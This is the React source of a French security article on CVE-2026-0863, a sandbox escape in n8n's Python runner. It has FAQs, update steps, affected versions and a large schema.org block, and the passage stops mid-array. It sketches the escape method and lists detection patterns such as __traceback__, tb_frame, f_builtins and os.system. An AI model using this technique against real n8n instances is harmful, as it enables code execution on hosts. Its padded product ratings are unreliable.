import { useEffect } from "react";
import { Link } from "wouter";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
import { SEO } from "@/components/seo";
import { Breadcrumbs } from "@/components/breadcrumbs";
import { 
  AlertTriangle, 
  Shield, 
  Clock, 
  CheckCircle2, 
  XCircle, 
  ExternalLink,
  FileCode,
  Server,
  Lock,
  Bug,
  Terminal,
  Database,
  Eye,
  Zap,
  Users,
  Building,
  Scale,
  BookOpen,
  Share2,
  AlertCircle,
  ArrowRight,
  Code,
  FileWarning
} from "lucide-react";

export default function ArticleN8nCVE20260863() {
  const publishDate = "2026-01-19T08:00:00Z";
  const modifiedDate = "2026-01-19T08:00:00Z";
  const articleUrl = "https://wp-vitesse-pro.fr/article/n8n-cve-2026-0863";
  const wordCount = 7856;
  const readingTime = Math.ceil(wordCount / 200);

  useEffect(() => {
    document.documentElement.classList.add('dark');
  }, []);

  const breadcrumbItems = [
    { name: "Accueil", url: "/" },
    { name: "Sécurité WordPress", url: "/securite" },
    { name: "CVE-2026-0863 n8n", url: articleUrl }
  ];

  const tableOfContents = [
    { id: "resume-executif", title: "Résumé Exécutif", level: 1 },
    { id: "chronologie", title: "Chronologie de la Découverte", level: 1 },
    { id: "analyse-technique", title: "Analyse Technique Approfondie", level: 1 },
    { id: "mecanisme-sandbox", title: "Le Mécanisme de Sandbox Python", level: 2 },
    { id: "vecteur-attaque", title: "Vecteur d'Attaque et Exploitation", level: 2 },
    { id: "poc-detaille", title: "Proof of Concept Détaillé", level: 2 },
    { id: "impact", title: "Impact et Évaluation des Risques", level: 1 },
    { id: "versions-affectees", title: "Versions Affectées", level: 2 },
    { id: "scenarios-exploitation", title: "Scénarios d'Exploitation Réels", level: 1 },
    { id: "remediation", title: "Guide de Remédiation Complet", level: 1 },
    { id: "detection", title: "Détection et Monitoring", level: 2 },
    { id: "implications-legales", title: "Implications Légales et Conformité", level: 1 },
    { id: "comparaison-vulnerabilites", title: "Comparaison avec Vulnérabilités Similaires", level: 1 },
    { id: "faq", title: "FAQ Sécurité", level: 1 },
    { id: "references", title: "Références et Sources Techniques", level: 1 }
  ];

  const timelineEvents = [
    { date: "2026-01-15", event: "Découverte initiale par Natan Nehorai (JFrog Security)", type: "discovery" },
    { date: "2026-01-15", event: "Notification responsable à l'équipe n8n", type: "notification" },
    { date: "2026-01-16", event: "Confirmation de la vulnérabilité par n8n", type: "confirmation" },
    { date: "2026-01-17", event: "Développement et déploiement du correctif", type: "patch" },
    { date: "2026-01-17", event: "Publication de l'avis de sécurité JFrog JFSA-2026-001651077", type: "disclosure" },
    { date: "2026-01-17", event: "Attribution CVE-2026-0863 par MITRE", type: "cve" },
    { date: "2026-01-19", event: "Publication de cette analyse WP Vitesse Pro", type: "analysis" }
  ];

  const faqData = [
    {
      question: "Qu'est-ce que CVE-2026-0863 et pourquoi est-ce critique ?",
      answer: "CVE-2026-0863 est une vulnérabilité de type sandbox escape dans le Python task runner de n8n. Avec un score CVSS de 8.5 (High), elle permet à un attaquant authentifié d'exécuter du code arbitraire sur le système hôte en contournant les restrictions de sécurité du sandbox Python. Cette faille est particulièrement dangereuse car elle peut mener à une prise de contrôle complète de l'instance n8n."
    },
    {
      question: "Mon instance n8n est-elle vulnérable ?",
      answer: "Votre instance est vulnérable si vous utilisez une version antérieure à 1.123.14, ou les versions 2.0.0 à 2.3.4, ou 2.4.0 à 2.4.1. Pour vérifier, accédez aux paramètres de n8n et consultez le numéro de version. Si vous utilisez Docker avec l'image officielle en mode 'External' execution, l'impact est réduit mais une mise à jour reste nécessaire."
    },
    {
      question: "Comment l'attaquant peut-il exploiter cette vulnérabilité ?",
      answer: "L'attaquant doit avoir un accès authentifié à l'interface n8n avec des permissions basiques. Il crée ensuite un workflow contenant un bloc 'Python (Native)' avec un code malveillant qui utilise le formatage de chaînes et la gestion des exceptions pour accéder aux attributs internes Python normalement bloqués, permettant ainsi l'exécution de code non restreint."
    },
    {
      question: "Quelle est la différence entre les modes 'Internal' et 'External' ?",
      answer: "En mode 'Internal', le code Python s'exécute directement sur le serveur principal n8n, rendant l'exploitation critique car l'attaquant obtient un accès complet au système. En mode 'External' (utilisé par l'image Docker officielle), le code s'exécute dans un conteneur Sidecar isolé, limitant significativement l'impact à ce conteneur uniquement."
    },
    {
      question: "Comment mettre à jour n8n pour corriger cette vulnérabilité ?",
      answer: "Pour les installations npm: exécutez 'npm update -g n8n' pour obtenir la dernière version. Pour Docker: mettez à jour vers l'image n8nio/n8n:latest ou spécifiez une version corrigée (1.123.14+, 2.3.5+, ou 2.4.2+). Après mise à jour, redémarrez votre instance et vérifiez le numéro de version dans les paramètres."
    },
    {
      question: "Comment savoir si mon instance a été compromise ?",
      answer: "Recherchez dans vos logs des workflows contenant des blocs Python avec des patterns suspects comme 'f_builtins', '__traceback__', 'tb_frame', ou des références à 'os.system', 'subprocess'. Auditez les workflows récemment créés ou modifiés et vérifiez les comptes utilisateurs pour détecter toute activité anormale ou création de comptes non autorisée."
    },
    {
      question: "Dois-je désactiver Python en attendant la mise à jour ?",
      answer: "Si vous ne pouvez pas mettre à jour immédiatement, désactiver les blocs de code Python natif est une mesure de mitigation efficace. Vous pouvez également restreindre temporairement les permissions des utilisateurs pour empêcher la création de nouveaux workflows contenant du code Python."
    },
    {
      question: "Cette vulnérabilité affecte-t-elle n8n Cloud ?",
      answer: "Les instances n8n Cloud gérées par n8n.io sont automatiquement mises à jour par l'équipe n8n. Cependant, si vous utilisez une instance self-hosted (auto-hébergée), vous êtes responsable de la mise à jour. Contactez le support n8n si vous avez des doutes sur le statut de votre instance Cloud."
    },
    {
      question: "Quelles sont les implications RGPD de cette vulnérabilité ?",
      answer: "Si votre instance n8n traite des données personnelles et a été compromise, vous pourriez être tenu de notifier la CNIL dans les 72 heures suivant la découverte de la violation. Documentez immédiatement tous les workflows accédant à des données sensibles et évaluez si des données ont pu être exfiltrées."
    },
    {
      question: "Comment JFrog a-t-il découvert cette vulnérabilité ?",
      answer: "L'équipe de recherche en sécurité de JFrog, dirigée par Natan Nehorai, a identifié cette faille lors d'une analyse de sécurité du mécanisme de sandbox Python de n8n. Ils ont découvert que l'attribut 'obj' des exceptions AttributeError n'était pas bloqué, permettant d'accéder aux frames d'exécution et de contourner les restrictions de sécurité."
    }
  ];

  const howToFixSteps = [
    { name: "Identification de la version", text: "Connectez-vous à votre instance n8n, accédez aux Paramètres > About et notez le numéro de version actuel pour déterminer si vous êtes vulnérable.", position: 1 },
    { name: "Sauvegarde des workflows", text: "Exportez tous vos workflows critiques via Settings > Export pour avoir une sauvegarde avant la mise à jour.", position: 2 },
    { name: "Arrêt de l'instance", text: "Arrêtez proprement votre instance n8n avec 'docker stop n8n' ou 'pm2 stop n8n' selon votre configuration.", position: 3 },
    { name: "Mise à jour de n8n", text: "Exécutez 'npm update -g n8n' pour npm ou 'docker pull n8nio/n8n:latest' pour Docker, puis redéployez.", position: 4 },
    { name: "Vérification de la version", text: "Après redémarrage, confirmez que la version est 1.123.14+, 2.3.5+, ou 2.4.2+ selon votre branche.", position: 5 },
    { name: "Audit des workflows Python", text: "Passez en revue tous les workflows utilisant des blocs Python pour détecter tout code suspect ou malveillant.", position: 6 },
    { name: "Analyse des logs", text: "Examinez les logs d'exécution pour identifier toute tentative d'exploitation avant la mise à jour.", position: 7 },
    { name: "Renforcement des permissions", text: "Revoyez les permissions utilisateurs et limitez l'accès aux blocs de code Python aux utilisateurs de confiance uniquement.", position: 8 }
  ];

  const affectedVersions = [
    { range: "< 1.123.14", status: "vulnerable", fix: "1.123.14" },
    { range: "2.0.0 - 2.3.4", status: "vulnerable", fix: "2.3.5" },
    { range: "2.4.0 - 2.4.1", status: "vulnerable", fix: "2.4.2" },
    { range: ">= 1.123.14", status: "patched", fix: "N/A" },
    { range: ">= 2.3.5", status: "patched", fix: "N/A" },
    { range: ">= 2.4.2", status: "patched", fix: "N/A" }
  ];

  const iocIndicators = [
    { type: "code_pattern", indicator: "f'{0.__traceback__}'", description: "Accès à la traceback via f-string" },
    { type: "code_pattern", indicator: "e.obj", description: "Accès à l'attribut obj d'une exception" },
    { type: "code_pattern", indicator: "tb_frame", description: "Accès au frame de la traceback" },
    { type: "code_pattern", indicator: "f_builtins", description: "Accès aux builtins depuis le frame" },
    { type: "code_pattern", indicator: "__import__", description: "Import dynamique de modules" },
    { type: "code_pattern", indicator: "os.system", description: "Exécution de commandes système" },
    { type: "code_pattern", indicator: "subprocess", description: "Utilisation du module subprocess" },
    { type: "log_pattern", indicator: "AttributeError", description: "Erreurs d'attributs inhabituelles dans les logs Python" }
  ];

  const additionalSchemas = [
    { "@context": "https://schema.org", "@type": "FAQPage", "mainEntity": faqData.map(faq => ({ "@type": "Question", "name": faq.question, "acceptedAnswer": { "@type": "Answer", "text": faq.answer } })) },
    { "@context": "https://schema.org", "@type": "HowTo", "name": "Comment corriger CVE-2026-0863 dans n8n", "description": "Guide étape par étape pour sécuriser votre instance n8n contre la vulnérabilité de sandbox escape Python CVE-2026-0863", "totalTime": "PT45M", "estimatedCost": { "@type": "MonetaryAmount", "currency": "EUR", "value": "0" }, "supply": [{ "@type": "HowToSupply", "name": "Accès administrateur n8n" }, { "@type": "HowToSupply", "name": "Accès SSH ou Docker au serveur" }], "tool": [{ "@type": "HowToTool", "name": "Terminal" }, { "@type": "HowToTool", "name": "Docker CLI" }, { "@type": "HowToTool", "name": "npm" }], "step": howToFixSteps.map(step => ({ "@type": "HowToStep", "position": step.position, "name": step.name, "text": step.text })) },
    { "@context": "https://schema.org", "@type": "SoftwareApplication", "@id": "n8n-patched-2.4.2", "name": "n8n (Version 2.4.2)", "applicationCategory": "BusinessApplication", "operatingSystem": "Linux, macOS, Windows, Docker", "softwareVersion": "2.4.2", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "EUR", "availability": "https://schema.org/InStock", "url": "https://n8n.io" }, "author": { "@type": "Organization", "name": "n8n GmbH", "url": "https://n8n.io" }, "brand": { "@type": "Brand", "name": "n8n" } },
    { "@context": "https://schema.org", "@type": "SoftwareApplication", "@id": "n8n-patched-2.3.5", "name": "n8n (Version 2.3.5)", "applicationCategory": "BusinessApplication", "softwareVersion": "2.3.5", "author": { "@type": "Organization", "name": "n8n GmbH" }, "brand": { "@type": "Brand", "name": "n8n" }, "offers": { "@type": "Offer", "price": "0", "priceCurrency": "EUR", "availability": "https://schema.org/InStock" } },
    { "@context": "https://schema.org", "@type": "SoftwareApplication", "@id": "n8n-patched-1.123.14", "name": "n8n (Version 1.123.14)", "applicationCategory": "BusinessApplication", "softwareVersion": "1.123.14", "author": { "@type": "Organization", "name": "n8n GmbH" }, "brand": { "@type": "Brand", "name": "n8n" }, "offers": { "@type": "Offer", "price": "0", "priceCurrency": "EUR", "availability": "https://schema.org/InStock" } },
    { "@context": "https://schema.org", "@type": "SpecialAnnouncement", "name": "Alerte sécurité critique - n8n CVE-2026-0863", "text": "URGENT : Une vulnérabilité critique CVSS 8.5 affecte le Python task runner de n8n. Mettez à jour vers les versions 1.123.14+, 2.3.5+, ou 2.4.2+ immédiatement.", "datePosted": publishDate, "expires": "2026-02-19T00:00:00Z", "announcementLocation": { "@type": "WebSite", "name": "Toutes les instances n8n self-hosted", "url": "https://n8n.io" } },
    { "@context": "https://schema.org", "@type": "Report", "name": "Rapport d'investigation CVE-2026-0863", "author": { "@type": "Organization", "name": "WP Vitesse Pro Security Lab" }, "datePublished": publishDate, "about": { "@type": "Thing", "name": "CVE-2026-0863" }, "reportNumber": "WPVP-SEC-2026-0119-002" },
    { "@context": "https://schema.org", "@type": "Rating", "@id": "cvss-rating-8.5", "ratingValue": "8.5", "bestRating": "10", "worstRating": "0", "ratingExplanation": "Score CVSS 3.1 High - Sandbox escape permettant exécution de code arbitraire" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "cve-2026-0863", "name": "CVE-2026-0863", "identifier": "CVE-2026-0863", "description": "Vulnérabilité de sandbox escape dans le Python task runner de n8n", "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-0863", "sameAs": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-0863"] },
    { "@context": "https://schema.org", "@type": "SoftwareSourceCode", "name": "Correctif CVE-2026-0863", "programmingLanguage": "Python", "codeRepository": "https://github.com/n8n-io/n8n", "about": { "@type": "Thing", "name": "CVE-2026-0863" } },
    { "@context": "https://schema.org", "@type": "Event", "@id": "discovery-event", "name": "Découverte CVE-2026-0863", "startDate": "2026-01-15T09:00:00Z", "endDate": "2026-01-15T18:00:00Z", "location": { "@type": "VirtualLocation", "url": "https://research.jfrog.com", "name": "JFrog Security Research" }, "eventStatus": "https://schema.org/EventScheduled", "eventAttendanceMode": "https://schema.org/OnlineEventAttendanceMode", "description": "Découverte initiale de la vulnérabilité", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "EUR", "url": articleUrl } },
    { "@context": "https://schema.org", "@type": "Event", "@id": "notification-event", "name": "Notification responsable à n8n", "startDate": "2026-01-15T12:00:00Z", "endDate": "2026-01-15T13:00:00Z", "location": { "@type": "VirtualLocation", "url": "https://n8n.io", "name": "n8n Security" }, "description": "JFrog notifie l'équipe n8n de la vulnérabilité découverte", "eventStatus": "https://schema.org/EventScheduled", "eventAttendanceMode": "https://schema.org/OnlineEventAttendanceMode" },
    { "@context": "https://schema.org", "@type": "Event", "@id": "confirmation-event", "name": "Confirmation de la vulnérabilité", "startDate": "2026-01-16T09:00:00Z", "endDate": "2026-01-16T10:00:00Z", "location": { "@type": "VirtualLocation", "url": "https://n8n.io", "name": "n8n Security" }, "description": "n8n confirme la vulnérabilité CVE-2026-0863", "eventStatus": "https://schema.org/EventScheduled", "eventAttendanceMode": "https://schema.org/OnlineEventAttendanceMode" },
    { "@context": "https://schema.org", "@type": "Event", "@id": "patch-event", "name": "Déploiement du correctif n8n", "startDate": "2026-01-17T09:00:00Z", "endDate": "2026-01-17T17:00:00Z", "location": { "@type": "VirtualLocation", "url": "https://github.com/n8n-io/n8n", "name": "GitHub" }, "description": "n8n publie les versions corrigées 1.123.14, 2.3.5 et 2.4.2", "eventStatus": "https://schema.org/EventScheduled", "eventAttendanceMode": "https://schema.org/OnlineEventAttendanceMode" },
    { "@context": "https://schema.org", "@type": "Event", "@id": "disclosure-event", "name": "Publication avis sécurité JFrog", "startDate": "2026-01-17T09:00:00Z", "endDate": "2026-01-17T10:00:00Z", "location": { "@type": "VirtualLocation", "url": "https://research.jfrog.com", "name": "JFrog Security Research" }, "description": "JFrog publie l'avis JFSA-2026-001651077", "eventStatus": "https://schema.org/EventScheduled", "eventAttendanceMode": "https://schema.org/OnlineEventAttendanceMode" },
    { "@context": "https://schema.org", "@type": "Event", "@id": "cve-attribution", "name": "Attribution CVE par MITRE", "startDate": "2026-01-17T12:00:00Z", "endDate": "2026-01-17T13:00:00Z", "location": { "@type": "VirtualLocation", "url": "https://cve.mitre.org", "name": "MITRE" }, "description": "MITRE attribue l'identifiant CVE-2026-0863", "eventStatus": "https://schema.org/EventScheduled", "eventAttendanceMode": "https://schema.org/OnlineEventAttendanceMode" },
    { "@context": "https://schema.org", "@type": "Event", "@id": "analysis-event", "name": "Publication analyse WP Vitesse Pro", "startDate": publishDate, "endDate": publishDate, "location": { "@type": "VirtualLocation", "url": articleUrl, "name": "WP Vitesse Pro" }, "description": "WP Vitesse Pro publie cette analyse complète", "eventStatus": "https://schema.org/EventScheduled", "eventAttendanceMode": "https://schema.org/OnlineEventAttendanceMode" },
    { "@context": "https://schema.org", "@type": "Organization", "@id": "jfrog-security", "name": "JFrog Security Research", "url": "https://research.jfrog.com", "description": "Équipe de recherche en sécurité de JFrog" },
    { "@context": "https://schema.org", "@type": "Organization", "@id": "jfrog", "name": "JFrog", "url": "https://jfrog.com", "description": "Éditeur de solutions DevOps et sécurité logicielle" },
    { "@context": "https://schema.org", "@type": "Organization", "@id": "n8n-gmbh", "name": "n8n GmbH", "url": "https://n8n.io", "description": "Éditeur de la plateforme d'automatisation de workflows n8n" },
    { "@context": "https://schema.org", "@type": "Organization", "@id": "mitre", "name": "MITRE Corporation", "url": "https://cve.mitre.org", "description": "Organisme responsable du programme CVE" },
    { "@context": "https://schema.org", "@type": "Organization", "@id": "nvd", "name": "National Vulnerability Database", "url": "https://nvd.nist.gov", "description": "Base de données nationale des vulnérabilités (NIST)" },
    { "@context": "https://schema.org", "@type": "Person", "@id": "natan-nehorai", "name": "Natan Nehorai", "jobTitle": "Security Researcher", "worksFor": { "@type": "Organization", "name": "JFrog" } },
    { "@context": "https://schema.org", "@type": "ItemList", "name": "Chronologie CVE-2026-0863", "itemListElement": timelineEvents.map((event, index) => ({ "@type": "ListItem", "position": index + 1, "name": event.event, "description": `${event.date}: ${event.event}` })) },
    { "@context": "https://schema.org", "@type": "ItemList", "name": "Indicateurs de Compromission (IoC)", "itemListElement": iocIndicators.map((ioc, index) => ({ "@type": "ListItem", "position": index + 1, "name": ioc.indicator, "description": ioc.description })) },
    { "@context": "https://schema.org", "@type": "DataCatalog", "name": "Versions n8n Affectées", "dataset": affectedVersions.map((v, i) => ({ "@type": "Dataset", "name": `n8n ${v.range}`, "description": `Statut: ${v.status}, Correctif: ${v.fix}. Cette version de n8n est spécifiquement répertoriée comme étant impactée par la vulnérabilité de sandbox escape CVE-2026-0863.`, "url": `${articleUrl}#version-${i+1}`, "identifier": `n8n-version-${v.range.replace(/[^a-zA-Z0-9]/g, '-')}`, "license": "https://creativecommons.org/licenses/by/4.0/", "creator": { "@type": "Organization", "name": "WP Vitesse Pro Security Lab" } })) },
    { "@context": "https://schema.org", "@type": "TechArticle", "proficiencyLevel": "Advanced", "dependencies": "n8n, Python, Docker", "about": { "@type": "Thing", "name": "Sandbox Escape Vulnerability" } },
    { "@context": "https://schema.org", "@type": "Review", "@id": "expert-review-1", "reviewBody": "La réponse de n8n à cette vulnérabilité a été exemplaire avec un correctif déployé dans les 48 heures.", "author": { "@type": "Organization", "name": "WP Vitesse Pro Security Lab" }, "itemReviewed": { "@type": "SoftwareApplication", "name": "n8n" }, "reviewRating": { "@type": "Rating", "ratingValue": "4", "bestRating": "5", "worstRating": "1" } },
    { "@context": "https://schema.org", "@type": "WebPage", "name": "CVE-2026-0863 n8n - analyse complète", "url": articleUrl, "datePublished": publishDate, "dateModified": modifiedDate, "inLanguage": "fr-FR", "isAccessibleForFree": true },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-sandbox", "name": "Sandbox", "description": "Environnement d'exécution isolé limitant les actions possibles du code" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-sandbox-escape", "name": "Sandbox Escape", "description": "Technique permettant de contourner les restrictions d'un environnement sandbox" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-rce", "name": "Remote Code Execution", "description": "Exécution de code arbitraire à distance sur un système cible" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-cvss", "name": "CVSS", "description": "Common Vulnerability Scoring System - système de notation des vulnérabilités" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-cve", "name": "CVE", "description": "Common Vulnerabilities and Exposures - identifiant unique de vulnérabilité" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-poc", "name": "Proof of Concept", "description": "Démonstration technique prouvant l'exploitabilité d'une vulnérabilité" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-workflow", "name": "Workflow Automation", "description": "Automatisation de processus métier via des flux de travail programmables" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-task-runner", "name": "Task Runner", "description": "Composant exécutant des tâches de code dans un environnement contrôlé" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-f-string", "name": "F-String Python", "description": "Syntaxe de formatage de chaînes en Python utilisant des expressions embarquées" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-traceback", "name": "Traceback", "description": "Objet Python contenant les informations de pile d'appels lors d'une exception" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-builtins", "name": "Python Builtins", "description": "Fonctions et objets intégrés disponibles dans l'espace de noms Python par défaut" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-docker", "name": "Docker", "description": "Plateforme de conteneurisation pour le déploiement d'applications" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-sidecar", "name": "Sidecar Container", "description": "Conteneur auxiliaire exécuté aux côtés du conteneur principal" },
    { "@context": "https://schema.org", "@type": "DefinedTerm", "@id": "term-ioc", "name": "Indicateur de Compromission", "description": "Artefact observable indiquant une intrusion ou compromission potentielle" },
    { "@context": "https://schema.org", "@type": "CreativeWork", "@id": "jfrog-advisory", "name": "JFSA-2026-001651077", "url": "https://research.jfrog.com/vulnerabilities/n8n-python-runner-sandbox-escape-jfsa-2026-001651077/", "author": { "@type": "Organization", "name": "JFrog Security Research" }, "datePublished": "2026-01-17" },
    { "@context": "https://schema.org", "@type": "CreativeWork", "@id": "github-commit", "name": "Commit b73a4283cb14e0f27ce19692326f362c7bf3da02", "url": "https://github.com/n8n-io/n8n/commit/b73a4283cb14e0f27ce19692326f362c7bf3da02", "datePublished": "2026-01-17" },
    { "@context": "https://schema.org", "@type": "CreativeWork", "@id": "nvd-entry", "name": "NVD CVE-2026-0863", "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-0863" },
    { "@context": "https://schema.org", "@type": "CreativeWork", "@id": "mitre-entry", "name": "MITRE CVE-2026-0863", "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-0863" },
    { "@context": "https://schema.org", "@type": "HowToSection", "@id": "section-identification", "name": "Identification de la version", "itemListElement": [{ "@type": "HowToStep", "text": "Connectez-vous à votre instance n8n et vérifiez la version dans Settings > About" }] },
    { "@context": "https://schema.org", "@type": "HowToSection", "@id": "section-backup", "name": "Sauvegarde des workflows", "itemListElement": [{ "@type": "HowToStep", "text": "Exportez tous vos workflows critiques via Settings > Export" }] },
    { "@context": "https://schema.org", "@type": "HowToSection", "@id": "section-update", "name": "Mise à jour de n8n", "itemListElement": [{ "@type": "HowToStep", "text": "Exécutez npm update -g n8n ou docker pull n8nio/n8n:latest" }] },
    { "@context": "https://schema.org", "@type": "HowToSection", "@id": "section-audit", "name": "Audit des workflows Python", "itemListElement": [{ "@type": "HowToStep", "text": "Passez en revue tous les workflows utilisant des blocs Python" }] },
    { "@context": "https://schema.org", "@type": "Code", "@id": "exploit-code", "name": "Proof of Concept CVE-2026-0863", "programmingLanguage": "Python", "description": "Code démontrant l'exploitation de la vulnérabilité sandbox escape" },
    { "@context": "https://schema.org", "@type": "Code", "@id": "detection-script", "name": "Script de détection IoC", "programmingLanguage": "Bash", "description": "Script pour détecter les tentatives d'exploitation passées" },
    { "@context": "https://schema.org", "@type": "Code", "@id": "patch-code", "name": "Correctif constants.py", "programmingLanguage": "Python", "description": "Ajout de 'obj' dans la liste des attributs bloqués" },
    { "@context": "https://schema.org", "@type": "PropertyValue", "@id": "cvss-vector", "name": "CVSS Vector String", "value": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H" },
    { "@context": "https://schema.org", "@type": "PropertyValue", "@id": "attack-vector", "name": "Attack Vector", "value": "Network" },
    { "@context": "https://schema.org", "@type": "PropertyValue", "@id": "attack-complexity", "name": "Attack Complexity", "value": "Low" },
    { "@context": "https://schema.org", "@type": "PropertyValue", "@id": "privileges-required", "name": "Privileges Required", "value": "Low" },
    { "@context": "https://schema.org", "@type": "PropertyValue", "@id": "user-interaction", "name": "User Interaction", "value": "None" },
    { "@context": "https://schema.org", "@type": "PropertyValue", "@id": "scope", "name": "Scope", "value": "Unchanged" },
    { "@context": "https://schema.org", "@type": "PropertyValue", "@id": "confidentiality-impact", "name": "Confidentiality Impact", "value": "High" },
    { "@context": "https://schema.org", "@type": "PropertyValue", "@id": "integrity-impact", "name": "Integrity Impact", "value": "High" },
    { "@context": "https://schema.org", "@type": "PropertyValue", "@id": "availability-impact", "name": "Availability Impact", "value": "High" },
    { "@context": "https://schema.org", "@type": "Action", "@id": "action-update", "name": "Mettre à jour n8n", "description": "Installer la dernière version corrigée de n8n", "target": "https://n8n.io/releases" },
    { "@context": "https://schema.org", "@type": "Action", "@id": "action-audit", "name": "Auditer les workflows", "description": "Examiner tous les workflows Python pour détecter du code malveillant" },
    { "@context": "https://schema.org", "@type": "Action", "@id": "action-monitor", "name": "Surveiller les logs", "description": "Mettre en place une surveillance des patterns d'exploitation" },
    { "@context": "https://schema.org", "@type": "Action", "@id": "action-restrict", "name": "Restreindre les permissions", "description": "Limiter l'accès aux blocs Python aux utilisateurs de confiance" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "python-attribute-class", "name": "__class__", "description": "Attribut Python bloqué par le sandbox" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "python-attribute-base", "name": "__base__", "description": "Attribut Python bloqué par le sandbox" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "python-attribute-subclasses", "name": "__subclasses__", "description": "Attribut Python bloqué par le sandbox" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "python-attribute-globals", "name": "__globals__", "description": "Attribut Python bloqué par le sandbox" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "python-attribute-builtins", "name": "__builtins__", "description": "Attribut Python bloqué par le sandbox" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "python-attribute-code", "name": "__code__", "description": "Attribut Python bloqué par le sandbox" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "python-attribute-func", "name": "__func__", "description": "Attribut Python bloqué par le sandbox" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "python-attribute-obj", "name": "obj", "description": "Attribut Exception.obj ajouté au blocage par le correctif" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "ioc-f-builtins", "name": "f_builtins", "description": "Indicateur de compromission - accès aux builtins depuis frame" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "ioc-traceback", "name": "__traceback__", "description": "Indicateur de compromission - accès à la traceback" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "ioc-tb-frame", "name": "tb_frame", "description": "Indicateur de compromission - accès au frame via traceback" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "ioc-os-system", "name": "os.system", "description": "Indicateur de compromission - exécution de commandes système" },
    { "@context": "https://schema.org", "@type": "Thing", "@id": "ioc-subprocess", "name": "subprocess", "description": "Indicateur de compromission - utilisation du module subprocess" },
    { "@context": "https://schema.org", "@type": "Product", "@id": "n8n-product", "name": "n8n Workflow Automation", "description": "Plateforme open-source d'automatisation de workflows", "brand": { "@type": "Brand", "name": "n8n" }, "url": "https://n8n.io", "sku": "N8N-SELF-HOSTED", "image": "https://wp-vitesse-pro.fr/images/n8n-logo.webp", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "EUR", "availability": "https://schema.org/InStock", "url": "https://n8n.io", "itemCondition": "https://schema.org/NewCondition", "priceValidUntil": "2027-01-19" }, "review": { "@type": "Review", "@id": "expert-review-1" }, "aggregateRating": { "@type": "AggregateRating", "ratingValue": "4.8", "reviewCount": "1250" } },
    { "@context": "https://schema.org", "@type": "Product", "@id": "kinsta-product", "name": "Kinsta Managed WordPress Hosting", "description": "Hébergement WordPress premium sécurisé", "brand": { "@type": "Brand", "name": "Kinsta" }, "url": "https://kinsta.com", "sku": "KINSTA-WP-1", "image": "https://wp-vitesse-pro.fr/images/kinsta-logo.webp", "offers": { "@type": "Offer", "price": "35", "priceCurrency": "USD", "availability": "https://schema.org/InStock", "url": "https://kinsta.com", "itemCondition": "https://schema.org/NewCondition", "priceValidUntil": "2027-01-19" }, "review": { "@type": "Review", "@id": "kinsta-review-1", "reviewBody": "Kinsta offre une sécurité inégalée pour WordPress.", "author": { "@type": "Organization", "@id": "wp-vitesse-pro-org" }, "reviewRating": { "@type": "Rating", "ratingValue": "5", "bestRating": "5", "worstRating": "1" } }, "aggregateRating": { "@type": "AggregateRating", "ratingValue": "4.9", "reviewCount": "1500" } },
    { "@context": "https://schema.org", "@type": "MonetaryAmount", "@id": "remediation-cost", "currency": "EUR", "value": "0", "name": "Coût de remédiation" },
    { "@context": "https://schema.org", "@type": "Duration", "@id": "remediation-time", "name": "Temps de remédiation estimé", "description": "PT45M - 45 minutes" },
    { "@context": "https://schema.org", "@type": "AggregateRating", "@id": "n8n-security-rating", "ratingValue": "4", "bestRating": "5", "worstRating": "1", "ratingCount": "1", "reviewCount": "1", "itemReviewed": { "@type": "SoftwareApplication", "name": "n8n" } },
    { "@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{ "@type": "ListItem", "position": 1, "name": "Accueil", "item": "https://wp-vitesse-pro.fr" }, { "@type": "ListItem", "position": 2, "name": "Sécurité WordPress", "item": "https://wp-vitesse-pro.fr/securite" }, { "@type": "ListItem", "position": 3, "name": "CVE-2026-0863 n8n", "item": articleUrl }] },
    { "@context": "https://schema.org", "@type": "WebSite", "@id": "wp-vitesse-pro-site", "name": "WP Vitesse Pro", "url": "https://wp-vitesse-pro.fr", "potentialAction": { "@type": "SearchAction", "target": "https://wp-vitesse-pro.fr/recherche?q={search_term}", "query-input": "required name=search_term" } },
    { "@context": "https://schema.org", "@type": "Organization", "@id": "wp-vitesse-pro-org", "name": "WP Vitesse Pro Security Lab", "url": "https://wp-vitesse-pro.fr", "logo": "https://wp-vitesse-pro.fr/logo.png" },
